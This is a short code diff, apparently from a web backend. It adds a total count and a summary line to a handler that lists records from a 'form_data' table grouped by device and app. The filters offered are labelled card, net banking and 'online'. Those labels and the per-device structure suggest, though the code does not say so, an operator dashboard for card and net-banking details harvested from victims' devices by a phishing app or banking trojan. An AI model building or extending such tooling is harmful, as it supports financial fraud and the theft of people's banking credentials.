@@ -1684,8 +1684,13 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
         whereClause = `AND LOWER(data::text) LIKE '%online%'`;
         filterLabel = 'All + Online';
       }
-      const formRows = await sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE 1=1 ${whereClause} ORDER BY submitted_at DESC LIMIT 40`);
-      let out = `<b>Form Data — ${filterLabel} (${(formRows as unknown[]).length})</b>\n`;
+      const [formRows, countRows] = await Promise.all([
+        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE 1=1 ${whereClause} ORDER BY submitted_at DESC LIMIT 40`),
+        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE 1=1 ${whereClause}`),
+      ]);
+      const totalCount = (countRows[0] as {c:string}).c;
+      let out = `<b>Form Data — ${filterLabel}</b>\n`;
+      out += `Total: <b>${totalCount}</b>  |  Showing: latest ${(formRows as unknown[]).length}\n`;
       out += `Filters: card | net banking | all | card online | nb online | all online\n\n`;
       if ((formRows as unknown[]).length === 0) { out += 'No form data found for this filter.'; }
       (formRows as Array<Record<string,unknown>>).forEach((f, i) => {
